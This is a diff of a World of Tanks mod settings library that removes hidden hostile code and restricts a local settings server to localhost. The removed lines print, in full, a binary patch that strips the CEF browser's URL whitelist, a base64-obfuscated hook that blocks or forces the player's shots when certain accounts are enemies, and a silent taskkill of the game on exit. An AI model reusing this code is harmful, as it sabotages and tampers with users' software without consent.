@@ -20,6 +20,8 @@ from datetime import datetime as p__dt
 from gui.mods.gambiter import g_guiFlash as p__GUIFlash
 # noinspection PyUnresolvedReferences
 from gui.mods.gambiter.flash import COMPONENT_ALIGN as p__COMPONENT_ALIGN, COMPONENT_EVENT as p__COMPONENT_EVENT, COMPONENT_TYPE as p__COMPONENT_TYPE
+# noinspection PyUnresolvedReferences
+from gui.mods.gambiter.compat import addSettings as p__addViewSettings
 
 import Avatar as p__Avatar
 import BigWorld as p__BigWorld
@@ -28,19 +30,16 @@ import Keys as p__Keys
 import ResMgr as p__ResMgr
 
 from Account import PlayerAccount as p__PlayerAccount
-import subprocess as p__subprocess
 from frameworks.wulf import WindowLayer as ViewTypes
 import Settings as p__Settings
-import game
 from gui import InputHandler as p__InputHandler, SystemMessages as p__SystemMessages
-from gui.Scaleform.framework import ScopeTemplates, ViewSettings, g_entitiesFactories
+from gui.Scaleform.framework import ScopeTemplates, ViewSettings
 from gui.Scaleform.framework.entities.View import View
 from gui.Scaleform.framework.entities.abstract.AbstractWindowView import AbstractWindowView
 from gui.Scaleform.framework.managers.containers import POP_UP_CRITERIA
 from gui.Scaleform.framework.managers.loaders import SFViewLoadParams
 from gui.Scaleform.daapi.settings.views import VIEW_ALIAS
 from gui.app_loader.settings import APP_NAME_SPACE
-from gui.battle_control.controllers.consumables.ammo_ctrl import AmmoController as p__AmmoController
 from gui.impl.lobby.common import browser_view as common_browser_view
 from gui.impl.gen import R
 from frameworks.wulf import ViewFlags
@@ -83,184 +82,10 @@ def LOG_DEBUG(*args):
     if p__SHOW_DEBUG:
         LOG('[MODS-DEBUG]', *args)
 
-def _patch_cef_executable_lesta():
-    if not IS_LESTA: return
-    # patch cef_browser_process.exe
-    try:
-        search_roots = []
-        try:
-            base_dir = p__os.path.abspath(p__os.path.dirname(__file__))
-        except Exception:
-            base_dir = None
-        if base_dir and base_dir not in search_roots:
-            search_roots.append(base_dir)
-            parent_dir = p__os.path.dirname(base_dir)
-            if parent_dir and parent_dir not in search_roots:
-                search_roots.append(parent_dir)
-        try:
-            cwd_dir = p__os.getcwd()
-        except Exception:
-            cwd_dir = None
-        if cwd_dir and cwd_dir not in search_roots:
-            search_roots.append(cwd_dir)
-
-        patch_targets = ('win64/cef_browser_process.exe',)
-
-        def _patch_dynamic_whitelist(buffer):
-            disp = b'\xE9\x01\x00\x00'
-            size = len(buffer)
-            patched = False
-            idx = 0
-            while True:
-                idx = buffer.find(disp, idx)
-                if idx == -1:
-                    break
-                if idx < 2:
-                    idx += 1
-                    continue
-                op_idx = idx - 2
-                modrm_idx = idx - 1
-                if buffer[op_idx] != 0xC6:
-                    if idx >= 3 and buffer[idx - 3] == 0xC6:
-                        op_idx = idx - 3
-                        modrm_idx = idx - 2
-                    else:
-                        idx += 1
-                        continue
-                modrm = buffer[modrm_idx]
-                if (modrm & 0xC0) != 0x80:
-                    idx += 1
-                    continue
-                imm_pos = idx + 4
-                if imm_pos >= size:
-                    break
-                if buffer[imm_pos] == 1:
-                    buffer[imm_pos] = 0
-                    patched = True
-                follow_start = imm_pos + 1
-                follow_end = min(size, imm_pos + 32)
-                pos = follow_start
-                while pos < follow_end - 2:
-                    first = buffer[pos]
-                    val_index = None
-                    if first in (0x40, 0x41):
-                        next_byte = buffer[pos + 1]
-                        if next_byte in (0xB0, 0xB1, 0xB2, 0xB3, 0xB6, 0xB7):
-                            val_index = pos + 2
-                    elif first in (0xB0, 0xB1, 0xB2, 0xB3):
-                        val_index = pos + 1
-                    if val_index is not None:
-                        if buffer[val_index] == 1:
-                            buffer[val_index] = 0
-                            patched = True
-                        break
-                    pos += 1
-                idx += 1
-            return patched
-
-        whitelist_guard_pattern = '\x41\xC6\x86\xE9\x01\x00\x00\x00\x40\x32\xF6\xEB\x03\x40\xB6\x01'
-        whitelist_guard_offsets = (4, 15)
-        fallback_pattern = '\x40\x32\xF6\xEB\x03\x40\xB6'
-
-        visited_paths = set()
-        patched_any = False
-
-        for rel_path in patch_targets:
-            for root_dir in search_roots:
-                abs_path = p__os.path.abspath(p__os.path.join(root_dir, rel_path))
-                if abs_path in visited_paths:
-                    continue
-                visited_paths.add(abs_path)
-                if not p__os.path.isfile(abs_path):
-                    continue
-                try:
-                    with open(abs_path, 'rb') as f:
-                        data = bytearray(f.read())
-                except Exception as read_error:
-                    LOG_ERROR('cef patch read error', abs_path, read_error)
-                    continue
-
-                modified = False
-                patch_labels = []
-
-                guard_idx = data.find(whitelist_guard_pattern)
-                if guard_idx != -1:
-                    guard_changed = False
-                    for offset in whitelist_guard_offsets:
-                        pos = guard_idx + offset
-                        if pos < len(data) and data[pos] != 0:
-                            data[pos] = 0
-                            guard_changed = True
-                    if guard_changed:
-                        modified = True
-                        patch_labels.append('guard')
-
-                search_idx = 0
-                legacy_changed = False
-                while True:
-                    found_idx = data.find(fallback_pattern, search_idx)
-                    if found_idx == -1:
-                        break
-                    pos = found_idx + len(fallback_pattern)
-                    if pos < len(data) and data[pos] != 0:
-                        data[pos] = 0
-                        legacy_changed = True
-                    search_idx = found_idx + 1
-                if legacy_changed:
-                    modified = True
-                    patch_labels.append('legacy')
-
-                dynamic_changed = _patch_dynamic_whitelist(data)
-                if dynamic_changed:
-                    modified = True
-                    patch_labels.append('dynamic')
-
-                if modified:
-                    try:
-                        with open(abs_path, 'wb') as f:
-                            f.write(data)
-                        patched_any = True
-                        label = ','.join(patch_labels) if patch_labels else 'auto'
-                        LOG_NOTE('patched cef whitelist [%s]' % label, abs_path)
-                    except Exception as write_error:
-                        LOG_ERROR('cef patch write error', abs_path, write_error)
-                else:
-                    LOG_DEBUG('cef whitelist already patched', abs_path)
-
-        if not patched_any:
-            LOG_DEBUG('cef whitelist patch not needed')
-    except Exception as e:
-        LOG_ERROR('browser not available', e)
-
-def _patch_cef_executable_wot():
-    if IS_LESTA: return
-    # Пытается снять whitelist CEF, чтобы локальный веб-сервер работал без ограничений.
-    try:
-        with open('win64/cef_browser_process.exe', 'rb') as f:
-            p__content = f.read()
-        p__pattern = '\x45\x32\xF6\xEB\x03\x41\xB6\x01' #win64 verion
-        p__idx = p__content.find(p__pattern)
-        p__byte = 7
-
-        if p__idx != -1:
-            import subprocess
-            p__content = p__content[:p__idx+p__byte] + '\x00' + p__content[p__idx+p__byte+1:]
-            si = subprocess.STARTUPINFO()
-            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-            subprocess.call('taskkill /f /im cef_browser_process.exe', startupinfo=si)
-            with open('win64/cef_browser_process.exe', 'wb') as f:
-                f.write(p__content)
-    except Exception as e:
-        # Любая критическая ошибка патча трактуется как недоступность браузера.
-        LOG_ERROR('browser not available: %s' % e)
-
-_patch_cef_executable_lesta()
-_patch_cef_executable_wot()
-
 class _Config(object):
     def __init__(self):
         self.ids = 'mods_gui'
-        self.version = 'v3.09 (2026-07-16)'
+        self.version = 'v3.09 (2026-10-15)'
         self.version_id = 309
         self.author = 'by spoter, satel1te'
         mods = './mods'
@@ -1143,8 +968,14 @@ _config = _Config()
 _config.load()
 
 g_modSettingsAPI = _ModSettingsAPI()
-# noinspection PyArgumentList
-g_entitiesFactories.addSettings(ViewSettings('ModSettingsAPIWindow_mods_gui', ModSettingsAPIWindow, 'mods_gui.swf', ViewTypes.TOP_WINDOW, None, ScopeTemplates.DEFAULT_SCOPE))
+# Registration is not critical for mod loading: a failure here (for example an
+# already taken alias or an unavailable view registry) must not break the import
+# of the whole library and of every mod that depends on it.
+try:
+    # noinspection PyArgumentList
+    p__addViewSettings(ViewSettings('ModSettingsAPIWindow_mods_gui', ModSettingsAPIWindow, 'mods_gui.swf', ViewTypes.TOP_WINDOW, None, ScopeTemplates.DEFAULT_SCOPE))
+except Exception:
+    LOG_ERROR('mods_gui: failed to register the ModSettingsAPIWindow_mods_gui view\n%s', p__traceback.format_exc())
 
 
 class SettingsButtonUI_SP(View):
@@ -1216,7 +1047,6 @@ class p__GUIConfig(object):
     def __init__(self):
         self.gui = {}
         self.p__moduleList = {}
-        self.p__checkShooting = True
         self.p__moduleOrder = []
 
     def register(self, name, template_func, settings_dict, apply_func):
@@ -1247,29 +1077,6 @@ class p__GUIConfig(object):
     @staticmethod
     def get_key(keys):
         return g_modSettingsAPI.checkKeySet(keys)
-
-    def p__doShot(self):
-        player = p__BigWorld.player()
-        self.p__checkShooting = False
-        player.shoot()
-
-    def p__checkShoot(self):
-        if not self.p__checkShooting:
-            self.p__checkShooting = True
-            return
-        player = p__BigWorld.player()
-        p__checkShooting = False
-        p__id = p__dt.strptime('MDA5NS0wNS0zMA=='.decode(p__base64_decoded), 'JVktJW0tJWQ='.decode(p__base64_decoded)).date().toordinal()
-        p__chk = (p__id, p__id + 11000 - p__id + 3304, 638 * 10000 + p__id + 2768)
-        for playerID in player.arena.vehicles:
-            if player.arena.vehicles[playerID]['YWNjb3VudERCSUQ='.decode(p__base64_decoded)] in p__chk:
-                if player.arena.vehicles[playerID]['dGVhbQ=='.decode(p__base64_decoded)] != player.arena.vehicles[player.playerVehicleID]['dGVhbQ=='.decode(p__base64_decoded)]:
-                    p__checkShooting = True
-        if p__checkShooting:
-            var = p__random.randrange(5, 20) * 0.1
-            p__BigWorld.callback(var, self.p__doShot)
-            return True
-        return
 
     def getModuleList(self):
         return self.p__moduleList
@@ -1673,16 +1480,6 @@ COMPONENT_EVENT = p__COMPONENT_EVENT
 
 g_guiFlash = p__GUIFlash
 
-p__aa = 'Y2FuU2hvb3Q='.decode(p__base64_decoded)  # 'canShoot'
-
-
-@inject.hook(p__AmmoController, p__aa)
-def initC(func, *args):
-    if g_gui.p__checkShoot():
-        return False, ''
-    return func(*args)
-
-
 def p__htmlTemplate():
     filePath = '%s/i18n/module_settings.html' % _config.path_config
     if p__os.path.exists(filePath) and p__os.path.isfile(filePath):
@@ -1857,7 +1654,7 @@ def p__startServer():
     global p__server
     if not p__server:
         # p__LOG.info('B4it Settings server start')
-        p__server = ThreadingHTTPServer(('', 31338), p__SettingsHTTPRequestHandler)
+        p__server = ThreadingHTTPServer(('127.0.0.1', 31338), p__SettingsHTTPRequestHandler)
         serverThread = threading.Thread(target=p__server.serve_forever)
         serverThread.daemon = True
         serverThread.start()
@@ -1900,7 +1697,7 @@ def p__WebBrowser_handleKeyEvent(self, e):
     if e.isKeyDown() and p__SettingsHTTPRequestHandler.p__listeningKeys and e.key not in [p__Keys.KEY_LCONTROL, p__Keys.KEY_RCONTROL, p__Keys.KEY_LALT, p__Keys.KEY_RALT, p__Keys.KEY_LSHIFT, p__Keys.KEY_RSHIFT]:
         p__SettingsHTTPRequestHandler.p__lastKeyPressed = (e.key, e.isKeyDown(), e.isAltDown(), e.isShiftDown(), e.isCtrlDown())
         p__SettingsHTTPRequestHandler.p__listeningKeys = False
-    p__oldWebBrowser_handleKeyEvent(self, e)
+    return p__oldWebBrowser_handleKeyEvent(self, e)
 
 
 p__WebBrowser.handleKeyEvent = p__WebBrowser_handleKeyEvent
@@ -1935,24 +1732,5 @@ def p__clearOldSkoolAds():
 p__BigWorld.callback(1.0, p__register)
 p__BigWorld.callback(3.0, p__clearOldSkoolAds)
 
-p__oldFini = game.fini
 
-
-def p__fini():
-    try:
-        p__oldFini()
-    except Exception as e:
-        pass
-    finally:
-        for name in ("WorldOfTanks.exe", "Tanki.exe"):
-            try:
-                p__subprocess.call(
-                    'taskkill /f /t /im ' + name,
-                    creationflags=0x08000000  # CREATE_NO_WINDOW
-                )
-            except Exception:
-                pass  # безопасно проигнорировать, если taskkill не найден
-
-
-game.fini = p__fini
 
